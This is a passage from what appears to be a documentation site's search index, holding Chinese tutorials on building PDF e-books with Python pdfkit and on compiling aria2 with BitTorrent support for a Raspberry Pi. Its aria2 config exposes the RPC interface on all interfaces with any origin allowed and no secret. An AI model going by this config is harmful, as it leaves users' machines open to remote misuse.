\u683c\u5f0f\u7684\u7535\u5b50\u4e66\uff0c\u91cc\u9762\u53ef\u4ee5\u76f4\u63a5\u4f20\u4e00\u4e2a\u5b57\u7b26\u4e32\uff0c\u4e5f\u53ef\u4ee5\u7528 html \u6807\u7b7e\u5305\u88f9\u8fd9\u4e2a\u5b57\u7b26\u4e32 pdfkit.from_file([file_name,],'demo.pdf') \u8fd9\u4e2a\u662f\u76f4\u63a5\u4f20\u5165\u4e00\u4e2a\u6587\u4ef6\u6216\u8005\u4e00\u4e2a\u5217\u8868\u5373\u662f\u591a\u4e2a\u6587\u4ef6\uff0c\u4e0d\u8fc7\u8fd9\u91cc\u4f20\u5165\u7684\u6587\u4ef6\u4e00\u822c\u90fd\u662fhtml\u683c\u5f0f\u7684\u6587\u4ef6 \u8fdb\u9636 \u5f53\u7136\u77e5\u9053\u8fd9\u4e2a\u662f\u591a\u4e48\u67af\u71e5\uff0c\u751f\u6210\u7684\u7535\u5b50\u4e66\u4e66\u4e5f\u4e0d\u80fd\u6dfb\u52a0\u5404\u79cd\u7684\u6837\u5f0f\uff0c\u4e0b\u9762\u6211\u4eec\u5c06\u4f1a\u4ecb\u7ecd\u4e00\u4e9b\u6dfb\u52a0\u7684\u6837\u5f0f\u7684\u65b9\u6cd5 options \u8fd9\u4e2a\u53c2\u6570\u662f\u4e0a\u9762\u51fd\u6570\u7684\u53ef\u9009\u53c2\u6570\uff0c\u5176\u4e2d\u5236\u5b9a\u4e86\u4e00\u4e9b\u9009\u9879\uff0c\u8be6\u60c5\u8bf7\u89c1 http://wkhtmltopdf.org/usage/wkhtmltopdf.txt , \u4f60\u53ef\u4ee5\u79fb\u9664\u9009\u9879\u540d\u5b57\u524d\u9762\u7684 '--' .\u5982\u679c\u9009\u9879\u6ca1\u6709\u503c, \u4f7f\u7528 None , Falseor , * \u4f5c\u4e3a\u5b57\u5178\u503c\uff0c\u4f8b\u5b50\u5982\u4e0b\uff1a options = { 'page-size': 'Letter', 'margin-top': '0.75in', 'margin-right': '0.75in', 'margin-bottom': '0.75in', 'margin-left': '0.75in', 'encoding': \"UTF-8\", 'custom-header': [ ('Accept-Encoding', 'gzip') ], 'cookie': [ ('cookie-name1', 'cookie-value1'), ('cookie-name2', 'cookie-value2'), ], 'outline-depth': 10, } cover \u8fd9\u4e2a\u53c2\u6570\u662f\u7528\u6765\u5236\u4f5c\u5c01\u9762\u7684\uff0c\u4e5f\u662f\u51fd\u6570\u4e2d\u7684\u4e00\u4e2a\u53c2\u6570\uff0c\u5982\u679c\u60f3\u8981\u5b9e\u73b0\u7684\u8bdd\u53ef\u4ee5\u5148\u5199\u4e00\u4e2ahtml\u6587\u672c\uff0c\u5728\u5176\u4e2d\u5d4c\u5165\u51e0\u5f20\u56fe\u7247\u6216\u8005\u6587\u5b57\u4f5c\u4e3a\u5c01\u9762\uff0c\u7136\u540e\u5199\u5165\u51fa\u4f20\u5165\u51fd\u6570\u5373\u53ef options = { 'page-size': 'Letter', 'margin-top': '0.75in', 'margin-right': '0.75in', 'margin-bottom': '0.75in', 'margin-left': '0.75in', 'encoding': \"UTF-8\", 'custom-header': [ ('Accept-Encoding', 'gzip') ], 'cookie': [ ('cookie-name1', 'cookie-value1'), ('cookie-name2', 'cookie-value2'), ], 'outline-depth': 10, } cover='demo.html' pdfkit.from_file('demo.html','demo.pdf',cover=cover,options=options) css \u8fd9\u91cc\u7684css\u4e5f\u662f\u51fd\u6570\u4e2d\u7684\u4e00\u4e2a\u53ef\u9009\u53c2\u6570\uff0c\u8fd9\u4e2a\u53c2\u6570\u4e3b\u8981\u7684\u4f5c\u7528\u4f5c\u7528\u5c31\u662f\u5728\u5176\u4e2d\u5b9a\u4e49\u81ea\u5df1\u559c\u6b22\u7684\u6837\u5f0f\uff0c\u5f53\u7136\u8fd9\u91cc\u4e5f\u53ef\u4ee5\u4f20\u5165\u4e00\u4e2a\u5217\u8868\uff0c\u5b9a\u4e49\u591a\u4e2a\u6837\u5f0fcss\u6587\u4ef6\uff0c\u5f53\u7136\u6ca1\u6709\u8fd9\u4e2a\u53c2\u6570\u4e5f\u53ef\u4ee5\u5b9e\u73b0\u5b9a\u4e49\u81ea\u5df1\u7684\u6837\u5f0f\uff0c\u53ea\u9700\u8981\u5728\u81ea\u5df1\u7684html\u6a21\u677f\u4e2d\u5b9a\u4e49\u5185\u5d4c\u7684\u6837\u5f0f\uff0c\u6216\u8005\u76f4\u63a5\u7528 <link> \u5f15\u7528\u5916\u9762\u7684\u6837\u5f0f\u5373\u53ef\uff0c\u672c\u4eba\u4eb2\u8bd5\u662f\u53ef\u4ee5\u7684\uff0c\u5177\u4f53\u7684\u4f7f\u7528\u5982\u4e0b css='demo.css' pdfkit.from_file('demo.html','demo.pdf',options=options,cover=cover,css=css) \u6ce8\u610f \u8fd9\u91cc\u751f\u6210 pdf \u7684\u65f6\u5019\u53ef\u80fd\u51fa\u73b0\u4e2d\u6587\u7684\u4e71\u7801\uff0c\u8bf7\u4e00\u5b9a\u5728 html \u6a21\u677f\u5f00\u5934\u6307\u5b9a\u5b57\u4f53 utf-8 -> <meta charset=\"UTF-8\"> \u53ef\u80fd\u5728\u722c\u53d6\u751f\u6210\u7684\u65f6\u5019\u4f1a\u51fa\u73b0 ascii \u9519\u8bef\uff0c\u53ea\u9700\u8981\u5728 py \u6587\u4ef6\u5f00\u5934\u5199\u4e0b\uff1a import sys import threading reload(sys) sys.setdefaultencoding('utf8') \u5199\u5165\u6587\u4ef6\u7684\u65f6\u5019\u4e0d\u60f3 python3 \u4e00\u6837\u53ef\u4ee5\u6307\u5b9a\u7f16\u7801\u683c\u5f0f\uff0c\u8fd9\u91cc\u6211\u4f7f\u7528\u7684\u662f codecs \u5e93\uff0c\u53ef\u4ee5\u5411python3\u4e00\u6837\u6307\u5b9a\u5176\u4e2d\u7684\u7f16\u7801\u683c\u5f0f \u5b9e\u6218 \u672c\u4eba\u722c\u4e86\u5ed6\u96ea\u5cf0\u8001\u5e08\u7684 python2.7 \u7684\u6559\u7a0b\uff0c\u5e76\u4e14\u505a\u6210\u4e86\u7535\u5b50\u4e66\uff0c\u622a\u56fe\u5982\u4e0b python\u6559\u7a0b \u6ce8\u610f \u8fd9\u91cc\u5e76\u6ca1\u6709\u4f7f\u7528\u6846\u67b6\uff0c\u5982\u679c\u6709\u5174\u8da3\u7684\u670b\u53cb\u53ef\u4ee5\u7528\u6846\u67b6\u5199\u4e00\u4e2a\u722c\u53d6\u5168\u7ad9\u7684 \u8fd9\u91cc\u7684\u4e3b\u8981\u7528\u5230\u7684\u662f BeautifulSoup \u548c requests ,\u8be6\u60c5\u53ef\u4ee5\u770b\u6211\u7684\u535a\u5ba2\u4e2d\u7684 BeautifulSoup\u7528\u6cd5 ,\u540e\u7eed\u8fd8\u4f1a\u66f4\u65b0requests\u7684\u7528\u6cd5 \u6e90\u4ee3\u7801\u8bf7\u89c1 https://github.com/chenjiabing666/liaoxuefeng_pdfkit \u53c2\u8003\u6587\u7ae0 http://mp.weixin.qq.com/s/LH8nEFfVH4_tvYWo46CF5Q http://www.cnblogs.com/taceywong/p/5643978.html http://beautifulsoup.readthedocs.io/zh_CN/latest/#id44 \u539f\u6587\u94fe\u63a5\uff1a https://www.jianshu.com/p/cbe9d7456fe9","title":"Python\u5236\u4f5cpdf\u7535\u5b50\u4e66"},{"location":"Python/python%E5%88%B6%E4%BD%9Cpdf%E7%94%B5%E5%AD%90%E4%B9%A6/#pythonpdf","text":"","title":"python\u5236\u4f5cpdf\u7535\u5b50\u4e66"},{"location":"Python/python%E5%88%B6%E4%BD%9Cpdf%E7%94%B5%E5%AD%90%E4%B9%A6/#_1","text":"\u5236\u4f5c\u7535\u5b50\u4e66\u4f7f\u7528\u7684\u662f python \u7684 pdfkit \u8fd9\u4e2a\u5e93\uff0c pdfkit \u662f wkhtmltopdf \u7684 Python \u5c01\u88c5\u5305\uff0c\u56e0\u6b64\u5728\u5b89\u88c5\u8fd9\u4e2a\u4e4b\u524d\u8981\u5b89\u88c5 wkhtmltopdf","title":"\u51c6\u5907"},{"location":"Python/python%E5%88%B6%E4%BD%9Cpdf%E7%94%B5%E5%AD%90%E4%B9%A6/#wkhtmltopdf","text":"sudo apt-get install wkhtmltopdf ( ubantu \u4e0b\uff0c\u4e0d\u8fc7\u8fd9\u91cc\u5b89\u88c5\u7684\u65f6\u5019\u53ef\u80fd\u5bf9\u5e94\u7684\u7248\u672c\u4e0d\u540c\uff0c\u4f1a\u51fa\u73b0\u9519\u8bef\uff0c\u5982\u679c\u4e0d\u884c\u7684\u8bdd\u8fd8\u8bf7\u81ea\u5df1\u767e\u5ea6\u4e0b\uff0c\u6211\u5b89\u88c5\u7684\u65f6\u5019\u662f\u53ef\u4ee5\u7684) windows \u4e0b\u7684\u7528\u6237\u76f4\u63a5\u5230 wkhtmltopdf \u5b98\u7f51\u4e0b\u8f7d\u7a33\u5b9a\u7248\u672c\uff0c\u7136\u540e\u76f4\u63a5\u5b89\u88c5\u5373\u53ef\uff0c\u4f46\u662f\u5b89\u88c5\u4e4b\u540e\u9700\u8981\u6ce8\u610f\u7684\u662f\u4e00\u5b9a\u8981\u5c06\u5176\u6dfb\u52a0\u5230\u73af\u5883\u53d8\u91cf\u4e2d\uff0c\u5426\u5219\u4f1a\u51fa\u73b0\u627e\u4e0d\u5230\u8def\u5f84\u7684\u95ee\u9898","title":"\u5b89\u88c5wkhtmltopdf"},{"location":"Python/python%E5%88%B6%E4%BD%9Cpdf%E7%94%B5%E5%AD%90%E4%B9%A6/#python","text":"\u4ee5\u4e0b\u90fd\u662f\u6211\u4eec\u9700\u8981\u7528\u5230\u7684\u5e93 pip install requests pip install BeautifulSoup4 pip install pdfkit","title":"python\u5b89\u88c5\u4f9d\u8d56\u5305"},{"location":"Python/python%E5%88%B6%E4%BD%9Cpdf%E7%94%B5%E5%AD%90%E4%B9%A6/#pdfkit","text":"","title":"pdfkit\u7684\u7528\u6cd5"},{"location":"Python/python%E5%88%B6%E4%BD%9Cpdf%E7%94%B5%E5%AD%90%E4%B9%A6/#_2","text":"pdfkit.from_url([url,],'demo.pdf') \u8fd9\u4e2a\u662f\u76f4\u63a5\u4f20\u5165\u4e00\u4e2a url \u6216\u8005\u4e00\u4e2a url \u5217\u8868\uff0c\u7136\u540e\u901a\u8fc7\u8fd9\u4e2a\u51fd\u6570\u76f4\u63a5\u5c06\u5176\u7f51\u9875\u8f6c\u6362\u6210 demo.pdf ,\u6ce8\u610f\u8fd9\u91cc\u53ea\u80fd\u8f6c\u6362\u9759\u6001\u6587\u672c\uff0c\u5982\u679c\u4f7f\u7528js\u4e00\u4e9b\u811a\u672c\u7684\u8bdd\u662f\u4e0d\u80fd\u76f4\u63a5\u8f6c\u6362\u7684 pdfkit.from_string(\"<h1><a href=\"https://chenjiabing666.gituhb.io\">\u9648\u52a0\u5175\u7684\u535a\u5ba2</a></h1>\",'demo.pdf') \u8fd9\u4e2a\u662f\u76f4\u63a5\u8bb2\u4e00\u4e2a\u5b57\u7b26\u4e32\u8f6c\u6362\u6210 pdf \u683c\u5f0f\u7684\u7535\u5b50\u4e66\uff0c\u91cc\u9762\u53ef\u4ee5\u76f4\u63a5\u4f20\u4e00\u4e2a\u5b57\u7b26\u4e32\uff0c\u4e5f\u53ef\u4ee5\u7528 html \u6807\u7b7e\u5305\u88f9\u8fd9\u4e2a\u5b57\u7b26\u4e32 pdfkit.from_file([file_name,],'demo.pdf') \u8fd9\u4e2a\u662f\u76f4\u63a5\u4f20\u5165\u4e00\u4e2a\u6587\u4ef6\u6216\u8005\u4e00\u4e2a\u5217\u8868\u5373\u662f\u591a\u4e2a\u6587\u4ef6\uff0c\u4e0d\u8fc7\u8fd9\u91cc\u4f20\u5165\u7684\u6587\u4ef6\u4e00\u822c\u90fd\u662fhtml\u683c\u5f0f\u7684\u6587\u4ef6","title":"\u521d\u7ea7\u4e86\u89e3\u51fd\u6570"},{"location":"Python/python%E5%88%B6%E4%BD%9Cpdf%E7%94%B5%E5%AD%90%E4%B9%A6/#_3","text":"\u5f53\u7136\u77e5\u9053\u8fd9\u4e2a\u662f\u591a\u4e48\u67af\u71e5\uff0c\u751f\u6210\u7684\u7535\u5b50\u4e66\u4e66\u4e5f\u4e0d\u80fd\u6dfb\u52a0\u5404\u79cd\u7684\u6837\u5f0f\uff0c\u4e0b\u9762\u6211\u4eec\u5c06\u4f1a\u4ecb\u7ecd\u4e00\u4e9b\u6dfb\u52a0\u7684\u6837\u5f0f\u7684\u65b9\u6cd5","title":"\u8fdb\u9636"},{"location":"Python/python%E5%88%B6%E4%BD%9Cpdf%E7%94%B5%E5%AD%90%E4%B9%A6/#options","text":"\u8fd9\u4e2a\u53c2\u6570\u662f\u4e0a\u9762\u51fd\u6570\u7684\u53ef\u9009\u53c2\u6570\uff0c\u5176\u4e2d\u5236\u5b9a\u4e86\u4e00\u4e9b\u9009\u9879\uff0c\u8be6\u60c5\u8bf7\u89c1 http://wkhtmltopdf.org/usage/wkhtmltopdf.txt , \u4f60\u53ef\u4ee5\u79fb\u9664\u9009\u9879\u540d\u5b57\u524d\u9762\u7684 '--' .\u5982\u679c\u9009\u9879\u6ca1\u6709\u503c, \u4f7f\u7528 None , Falseor , * \u4f5c\u4e3a\u5b57\u5178\u503c\uff0c\u4f8b\u5b50\u5982\u4e0b\uff1a options = { 'page-size': 'Letter', 'margin-top': '0.75in', 'margin-right': '0.75in', 'margin-bottom': '0.75in', 'margin-left': '0.75in', 'encoding': \"UTF-8\", 'custom-header': [ ('Accept-Encoding', 'gzip') ], 'cookie': [ ('cookie-name1', 'cookie-value1'), ('cookie-name2', 'cookie-value2'), ], 'outline-depth': 10, }","title":"options"},{"location":"Python/python%E5%88%B6%E4%BD%9Cpdf%E7%94%B5%E5%AD%90%E4%B9%A6/#cover","text":"\u8fd9\u4e2a\u53c2\u6570\u662f\u7528\u6765\u5236\u4f5c\u5c01\u9762\u7684\uff0c\u4e5f\u662f\u51fd\u6570\u4e2d\u7684\u4e00\u4e2a\u53c2\u6570\uff0c\u5982\u679c\u60f3\u8981\u5b9e\u73b0\u7684\u8bdd\u53ef\u4ee5\u5148\u5199\u4e00\u4e2ahtml\u6587\u672c\uff0c\u5728\u5176\u4e2d\u5d4c\u5165\u51e0\u5f20\u56fe\u7247\u6216\u8005\u6587\u5b57\u4f5c\u4e3a\u5c01\u9762\uff0c\u7136\u540e\u5199\u5165\u51fa\u4f20\u5165\u51fd\u6570\u5373\u53ef options = { 'page-size': 'Letter', 'margin-top': '0.75in', 'margin-right': '0.75in', 'margin-bottom': '0.75in', 'margin-left': '0.75in', 'encoding': \"UTF-8\", 'custom-header': [ ('Accept-Encoding', 'gzip') ], 'cookie': [ ('cookie-name1', 'cookie-value1'), ('cookie-name2', 'cookie-value2'), ], 'outline-depth': 10, } cover='demo.html' pdfkit.from_file('demo.html','demo.pdf',cover=cover,options=options)","title":"cover"},{"location":"Python/python%E5%88%B6%E4%BD%9Cpdf%E7%94%B5%E5%AD%90%E4%B9%A6/#css","text":"\u8fd9\u91cc\u7684css\u4e5f\u662f\u51fd\u6570\u4e2d\u7684\u4e00\u4e2a\u53ef\u9009\u53c2\u6570\uff0c\u8fd9\u4e2a\u53c2\u6570\u4e3b\u8981\u7684\u4f5c\u7528\u4f5c\u7528\u5c31\u662f\u5728\u5176\u4e2d\u5b9a\u4e49\u81ea\u5df1\u559c\u6b22\u7684\u6837\u5f0f\uff0c\u5f53\u7136\u8fd9\u91cc\u4e5f\u53ef\u4ee5\u4f20\u5165\u4e00\u4e2a\u5217\u8868\uff0c\u5b9a\u4e49\u591a\u4e2a\u6837\u5f0fcss\u6587\u4ef6\uff0c\u5f53\u7136\u6ca1\u6709\u8fd9\u4e2a\u53c2\u6570\u4e5f\u53ef\u4ee5\u5b9e\u73b0\u5b9a\u4e49\u81ea\u5df1\u7684\u6837\u5f0f\uff0c\u53ea\u9700\u8981\u5728\u81ea\u5df1\u7684html\u6a21\u677f\u4e2d\u5b9a\u4e49\u5185\u5d4c\u7684\u6837\u5f0f\uff0c\u6216\u8005\u76f4\u63a5\u7528 <link> \u5f15\u7528\u5916\u9762\u7684\u6837\u5f0f\u5373\u53ef\uff0c\u672c\u4eba\u4eb2\u8bd5\u662f\u53ef\u4ee5\u7684\uff0c\u5177\u4f53\u7684\u4f7f\u7528\u5982\u4e0b css='demo.css' pdfkit.from_file('demo.html','demo.pdf',options=options,cover=cover,css=css)","title":"css"},{"location":"Python/python%E5%88%B6%E4%BD%9Cpdf%E7%94%B5%E5%AD%90%E4%B9%A6/#_4","text":"\u8fd9\u91cc\u751f\u6210 pdf \u7684\u65f6\u5019\u53ef\u80fd\u51fa\u73b0\u4e2d\u6587\u7684\u4e71\u7801\uff0c\u8bf7\u4e00\u5b9a\u5728 html \u6a21\u677f\u5f00\u5934\u6307\u5b9a\u5b57\u4f53 utf-8 -> <meta charset=\"UTF-8\"> \u53ef\u80fd\u5728\u722c\u53d6\u751f\u6210\u7684\u65f6\u5019\u4f1a\u51fa\u73b0 ascii \u9519\u8bef\uff0c\u53ea\u9700\u8981\u5728 py \u6587\u4ef6\u5f00\u5934\u5199\u4e0b\uff1a import sys import threading reload(sys) sys.setdefaultencoding('utf8') \u5199\u5165\u6587\u4ef6\u7684\u65f6\u5019\u4e0d\u60f3 python3 \u4e00\u6837\u53ef\u4ee5\u6307\u5b9a\u7f16\u7801\u683c\u5f0f\uff0c\u8fd9\u91cc\u6211\u4f7f\u7528\u7684\u662f codecs \u5e93\uff0c\u53ef\u4ee5\u5411python3\u4e00\u6837\u6307\u5b9a\u5176\u4e2d\u7684\u7f16\u7801\u683c\u5f0f","title":"\u6ce8\u610f"},{"location":"Python/python%E5%88%B6%E4%BD%9Cpdf%E7%94%B5%E5%AD%90%E4%B9%A6/#_5","text":"\u672c\u4eba\u722c\u4e86\u5ed6\u96ea\u5cf0\u8001\u5e08\u7684 python2.7 \u7684\u6559\u7a0b\uff0c\u5e76\u4e14\u505a\u6210\u4e86\u7535\u5b50\u4e66\uff0c\u622a\u56fe\u5982\u4e0b python\u6559\u7a0b","title":"\u5b9e\u6218"},{"location":"Python/python%E5%88%B6%E4%BD%9Cpdf%E7%94%B5%E5%AD%90%E4%B9%A6/#_6","text":"\u8fd9\u91cc\u5e76\u6ca1\u6709\u4f7f\u7528\u6846\u67b6\uff0c\u5982\u679c\u6709\u5174\u8da3\u7684\u670b\u53cb\u53ef\u4ee5\u7528\u6846\u67b6\u5199\u4e00\u4e2a\u722c\u53d6\u5168\u7ad9\u7684 \u8fd9\u91cc\u7684\u4e3b\u8981\u7528\u5230\u7684\u662f BeautifulSoup \u548c requests ,\u8be6\u60c5\u53ef\u4ee5\u770b\u6211\u7684\u535a\u5ba2\u4e2d\u7684 BeautifulSoup\u7528\u6cd5 ,\u540e\u7eed\u8fd8\u4f1a\u66f4\u65b0requests\u7684\u7528\u6cd5 \u6e90\u4ee3\u7801\u8bf7\u89c1 https://github.com/chenjiabing666/liaoxuefeng_pdfkit","title":"\u6ce8\u610f"},{"location":"Python/python%E5%88%B6%E4%BD%9Cpdf%E7%94%B5%E5%AD%90%E4%B9%A6/#_7","text":"http://mp.weixin.qq.com/s/LH8nEFfVH4_tvYWo46CF5Q http://www.cnblogs.com/taceywong/p/5643978.html http://beautifulsoup.readthedocs.io/zh_CN/latest/#id44 \u539f\u6587\u94fe\u63a5\uff1a https://www.jianshu.com/p/cbe9d7456fe9","title":"\u53c2\u8003\u6587\u7ae0"},{"location":"RPI/Aria2%20%E7%BC%96%E8%AF%91%20%E6%B7%BB%E5%8A%A0%E6%94%AF%E6%8C%81BT%E4%B8%8B%E8%BD%BD%E7%9A%84%E5%8A%9F%E8%83%BD%EF%BC%88X86%E5%92%8Carmhf%E7%9A%84%E6%A0%91%E8%8E%93%E6%B4%BE2%EF%BC%89/","text":"Aria2 \u7f16\u8bd1 \u6dfb\u52a0\u652f\u6301BT\u4e0b\u8f7d\u7684\u529f\u80fd\uff08X86\u548carmhf\u7684\u6811\u8393\u6d3e2\uff09 Aria2 \u6e90\u7801\u4e0b\u8f7d\u5730\u5740 http://sourceforge.net/projects/aria2/files/stable/ \u4e2a\u4eba\u8ba4\u4e3a 1.16.5 \u548c 1.17.1 \u6bd4 1.18 1.19 \u7a33\u5b9a\u5f88\u591a\uff0c\u6682\u65f6\u4e0d\u5efa\u8bae\u9ad8\u7248\u672c\u7f16\u8bd1 \u5176\u5b9e\u53e6\u4e00\u8bf4\u662f\u8981\u770b\u4f60\u7cfb\u7edf \u5982\u679c\u662f\u8001\u673a\u5668\u88c5\u7684\u65e7\u7cfb\u7edf\u5c31\u8001\u8001\u5b9e\u5b9e\u7528\u4f4e\u7248\u672c\uff0c\u4e0d\u8fc7\u8981\u662f\u4f4e\u4e8e1.16+ \u5c31\u4e0d\u5982\u7528\u8f6f\u4ef6\u6e90\u81ea\u5df1\u5e26\u7684\u7248\u672c \u6ca1\u5fc5\u8981\u81ea\u5df1\u8d39\u5c3d\u7f16\u8bd1\u4e86 tar zxvf aria2-1.17.tar.gz cd aria2-1.17.1 sudo ./configure ARIA2_STATIC=yes --enable-bittorrent --enable-metalink \u90e8\u5206\u673a\u5668\u8c8c\u4f3c\u53ef\u4ee5\u7f16\u8bd1 \u4f46\u662f\u4e0d\u80fdmake \u90a3\u5c31\u8003\u8651\u5220\u6389 ARIA2_STATIC=yes sudo ./configure --enable-bittorrent --enable-metalink \u9700\u8981\u7684lib sudo apt-get install gcc c++ autoconf automake libcppunit-dev autopoint openssl libtool sphinx-common sphinxsearch libgcrypt11-dev libxml2-dev pkg-config --enable-bittorrent --enable-metalink \u6dfb\u52a0BT\u548c\u78c1\u529b\u94fe\u7684\u652f\u6301 ubuntu 10.04.4 512M\u5185\u5b58 AMD LX800\u4f4e\u529f\u8017\u4e3b\u673a \u4e3b\u9891500MHz\u4e0a\u9762\u7684\u7f16\u8bd1\u7ed3\u679c configure: summary of build options: version: 0.1.1 shared 0:0:0 Host type: i586-pc-linux-gnu Install prefix: /usr/local C compiler: gcc CFlags: -g -O2 Library types: Shared=yes, Static=yes CUnit: no Build: i586-pc-linux-gnu Host: i586-pc-linux-gnu Target: i586-pc-linux-gnu Install prefix: /usr/local CC: gcc CXX: g++ CPP: gcc -E CXXFLAGS: -g -O2 CFLAGS: -g -O2 CPPFLAGS: -I$(top_builddir)/deps/wslay/lib/includes -I$(top_srcdir)/deps/wslay/lib/includes -I/usr/include/libxml2 LDFLAGS: -all-static -static-libgcc -static-libstdc++ LIBS: -lrt -lgcrypt -lxml2 -lz -lpthread -ldl -lrt DEFS: -DHAVE_CONFIG_H LibUV: no SQLite3: no SSL Support: AppleTLS: GnuTLS: no OpenSSL: no CA Bundle: LibXML2: yes LibExpat: LibCares: no Zlib: yes Epoll: yes Bittorrent: yes Metalink: yes XML-RPC: yes Message Digest: yes WebSocket: yes Libaria2: no bash_completion dir: ${datarootdir}/doc/${PACKAGE_TARNAME}/bash_completion Static build: yes \u6811\u8393\u6d3e2 Arm 4\u6838 1G\u5185\u5b58 \u4e3b\u9891 900MHz Ubuntu mate 15.04 vivid configure: summary of build options: version: 0.1.1 shared 0:0:0 Host type: armv7l-unknown-linux-gnueabihf Install prefix: /usr/local C compiler: gcc CFlags: -g -O2 Library types: Shared=yes, Static=yes CUnit: no Build: armv7l-unknown-linux-gnueabihf Host: armv7l-unknown-linux-gnueabihf Target: armv7l-unknown-linux-gnueabihf Install prefix: /usr/local CC: gcc CXX: g++ CPP: gcc -E CXXFLAGS: -g -O2 CFLAGS: -g -O2 CPPFLAGS: -I$(top_builddir)/deps/wslay/lib/includes -I$(top_srcdir)/deps/wslay/lib/includes -I/usr/include/libxml2 LDFLAGS: LIBS: -lgcrypt -lxml2 DEFS: -DHAVE_CONFIG_H LibUV: no SQLite3: no SSL Support: AppleTLS: GnuTLS: no OpenSSL: no CA Bundle: LibXML2: yes LibExpat: LibCares: no Zlib: no Epoll: yes Bittorrent: yes Metalink: yes XML-RPC: yes Message Digest: yes WebSocket: yes Libaria2: no bash_completion dir: ${datarootdir}/doc/${PACKAGE_TARNAME}/bash_completion Static build: \u540c\u65f6\u653e\u4e0a\u6811\u8393\u6d3e2 Ubuntu mate 15.04 vivid \u7684\u8f6f\u4ef6\u6e90 deb http://mirrors.ustc.edu.cn/ubuntu-ports/ vivid main restricted universe multiverse deb http://mirrors.ustc.edu.cn/ubuntu-ports/ vivid-updates main restricted universe multiverse deb http://mirrors.ustc.edu.cn/ubuntu-ports/ vivid-security main restricted universe multiverse deb http://mirrors.ustc.edu.cn/ubuntu-ports/ vivid-backports main restricted universe multiverse \u8fd9\u4e2a\u6bd4\u81ea\u5e26\u7684\u8f6f\u4ef6\u6e90\u5feb\u5f88\u591a 400k \u548c 50k \u4e0b\u8f7d\u901f\u5ea6\u7684\u5dee\u8ddd Bittorrent: yes Metalink: yes Static build: yes \u9ed8\u8ba4\u8fd9\u4e9b\u90fd\u662fno\uff0c\u4e5f\u5c31\u662f\u4e0d\u652f\u6301\u7684\u610f\u601d coufigure\u4e4b\u540e\u5c31\u662fmake\u548c\u5b89\u88c5\u4e86\uff0c\u5efa\u8bae\u5148\u5378\u4e86\u81ea\u5e26\u7684 sudo apt-get remove aria2 \u7136\u540e\u5728\u4f7f\u7528\u81ea\u5df1\u7684\u7f16\u8bd1\u7248\u672c sudo make sudo make install \u975e\u5e38\u65e0\u8bed\u7684\u662f\u672c\u6765\u5c313M\u591a\u7684\u6e90\u7801\u7f16\u8bd1\u4e86\u4ee5\u540e\u8981\u51e0\u767eM \u6811\u8393\u6d3e2 \u8fd8\u597d 4\u6838\u7f16\u8bd1\u901f\u5ea6\u4f9d\u65e7\u8fd8\u662f\u5f88\u6162\uff0c\u6ca1\u611f\u89c9\u80fd\u6bd4\u4f4e\u4e3b\u9891\u7684X86cpu\u5feb \u9644\u5e26 aria2 \u914d\u7f6e\u6587\u4ef6 enable-rpc=true rpc-allow-origin-all=true rpc-listen-all=true rpc-listen-port=6800 #event-poll=select disable-ipv6=true max-concurrent-downloads=2 continue=true max-connection-per-server=5 min-split-size=10M split=5 max-overall-download-limit=0 max-download-limit=0 max-overall-upload-limit=15k max-upload-limit=15k #lowest-speed-limit=0 #referer=* input-file=/etc/aria2/session.txt save-session=/etc/aria2/session.txt save-session-interval=30 dir=/nas/aria2 disk-cache=16M enable-mmap=true file-allocation=none force-save=true follow-torrent=true bt-hash-check-seed=true bt-seed-unverified=true bt-save-metadata=true #bt-request-peer-speed-limit=2M bt-save-metadata=true #seed-time=10 seed-ratio=0.1 log=/etc/aria2/aria2.log log-level=error max-download-result=50 \u542f\u52a8\u811a\u672c\u4fdd\u5b58\u5728 /etc/init.d/aria2 #!/bin/sh ### BEGIN INIT INFO # Provides: aria2 # Required-Start: # Required-Stop: # Default-Start: # Default-Stop: # Short-Description: aria2 ### END INIT INFO case $1 in start) touch /etc/aria2/session.txt /usr/bin/aria2c --conf-path=/etc/aria2/aria2.conf -D ;; stop) killall aria2c ;; *) echo \"Usage: /etc/init.d/aria2 {start|stop}\" exit 1 ;; esac exit 0 \u589e\u52a0\u542f\u52a8\u9879 \u5f15\u7528sudo update-rc.d aria2 defaults \u8fd9\u5c31\u662f\u4e3a\u561b\u7f16\u8bd1\u7684\u4e4b\u540e\u7684aria2\u6ca1\u6709BT\u4e0b\u8f7d\u529f\u80fd\u7684\u539f\u56e0\uff0c\u8c8c\u4f3c\u8fd9\u73a9\u610f\u4e0d\u52a0\u53c2\u6570\u4e0d\u7f16\u8bd1\u6210\u53ef\u7528 \u539f\u6587\u94fe\u63a5\uff1a https://www.iteye.com/blog/happysoul-2218060","title":"Aria2 \u7f16\u8bd1 \u6dfb\u52a0\u652f\u6301BT\u4e0b\u8f7d\u7684\u529f\u80fd\uff08X86\u548carmhf\u7684\u6811\u8393\u6d3e2\uff09"},{"location":"RPI/Aria2%20%E7%BC%96%E8%AF%91%20%E6%B7%BB%E5%8A%A0%E6%94%AF%E6%8C%81BT%E4%B8%8B%E8%BD%BD%E7%9A%84%E5%8A%9F%E8%83%BD%EF%BC%88X86%E5%92%8Carmhf%E7%9A%84%E6%A0%91%E8%8E%93%E6%B4%BE2%EF%BC%89/#aria2-btx86armhf2","text":"Aria2 \u6e90\u7801\u4e0b\u8f7d\u5730\u5740 http://sourceforge.net/projects/aria2/files/stable/ \u4e2a\u4eba\u8ba4\u4e3a 1.16.5 \u548c 1.17.1 \u6bd4 1.18 1.19 \u7a33\u5b9a\u5f88\u591a\uff0c\u6682\u65f6\u4e0d\u5efa\u8bae\u9ad8\u7248\u672c\u7f16\u8bd1 \u5176\u5b9e\u53e6\u4e00\u8bf4\u662f\u8981\u770b\u4f60\u7cfb\u7edf \u5982\u679c\u662f\u8001\u673a\u5668\u88c5\u7684\u65e7\u7cfb\u7edf\u5c31\u8001\u8001\u5b9e\u5b9e\u7528\u4f4e\u7248\u672c\uff0c\u4e0d\u8fc7\u8981\u662f\u4f4e\u4e8e1.16+ \u5c31\u4e0d\u5982\u7528\u8f6f\u4ef6\u6e90\u81ea\u5df1\u5e26\u7684\u7248\u672c \u6ca1\u5fc5\u8981\u81ea\u5df1\u8d39\u5c3d\u7f16\u8bd1\u4e86 tar zxvf aria2-1.17.tar.gz cd aria2-1.17.1 sudo ./configure ARIA2_STATIC=yes --enable-bittorrent --enable-metalink \u90e8\u5206\u673a\u5668\u8c8c\u4f3c\u53ef\u4ee5\u7f16\u8bd1 \u4f46\u662f\u4e0d\u80fdmake \u90a3\u5c31\u8003\u8651\u5220\u6389 ARIA2_STATIC=yes sudo ./configure --enable-bittorrent --enable-metalink \u9700\u8981\u7684lib sudo apt-get install gcc c++ 